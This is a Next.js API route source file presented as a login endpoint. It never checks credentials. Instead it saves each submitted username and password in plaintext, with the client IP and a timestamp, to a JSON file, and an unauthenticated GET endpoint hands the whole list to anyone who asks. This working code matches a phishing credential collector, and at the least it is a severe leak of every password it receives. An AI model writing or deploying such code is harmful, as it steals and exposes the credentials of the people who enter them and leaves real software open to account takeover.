import { NextRequest, NextResponse } from 'next/server';
import fs from 'fs';
import path from 'path';

// Define the type for our login data
interface LoginData {
  username: string;
  password: string;
  timestamp: string;
  ip?: string;
}

export async function POST(request: NextRequest) {
  try {
    const body = await request.json();
    const { username, password } = body;

    // Basic validation
    if (!username || !password) {
      return NextResponse.json(
        { error: 'Username and password are required' },
        { status: 400 }
      );
    }

    // Get IP address from headers
    let ip = 'unknown';
    const forwardedFor = request.headers.get('x-forwarded-for');
    const realIp = request.headers.get('x-real-ip');
    
    if (forwardedFor) {
      ip = forwardedFor.split(',')[0].trim();
    } else if (realIp) {
      ip = realIp;
    }

    // Create the data object
    const loginData: LoginData = {
      username,
      password,
      timestamp: new Date().toISOString(),
      ip
    };

    // Define the path for storing data
    const dataDir = path.join(process.cwd(), 'data');
    const filePath = path.join(dataDir, 'logins.json');

    // Create data directory if it doesn't exist
    if (!fs.existsSync(dataDir)) {
      fs.mkdirSync(dataDir, { recursive: true });
    }

    // Read existing data
    let existingData: LoginData[] = [];
    if (fs.existsSync(filePath)) {
      const fileContent = fs.readFileSync(filePath, 'utf-8');
      existingData = JSON.parse(fileContent);
    }

    // Add new login data
    existingData.push(loginData);

    // Write back to file
    fs.writeFileSync(filePath, JSON.stringify(existingData, null, 2));

    // In a real application, you would validate credentials here
    // and return a proper authentication token

    return NextResponse.json(
      { message: 'Login data stored successfully' },
      { status: 200 }
    );
  } catch (error) {
    console.error('Error storing login data:', error);
    return NextResponse.json(
      { error: 'Internal server error' },
      { status: 500 }
    );
  }
}

// GET endpoint to retrieve login data
export async function GET() {
  try {
    const dataDir = path.join(process.cwd(), 'data');
    const filePath = path.join(dataDir, 'logins.json');

    if (!fs.existsSync(filePath)) {
      return NextResponse.json([], { status: 200 });
    }

    const fileContent = fs.readFileSync(filePath, 'utf-8');
    const logins = JSON.parse(fileContent);

    return NextResponse.json(logins, { status: 200 });
  } catch (error) {
    console.error('Error reading login data:', error);
    return NextResponse.json(
      { error: 'Internal server error' },
      { status: 500 }
    );
  }
}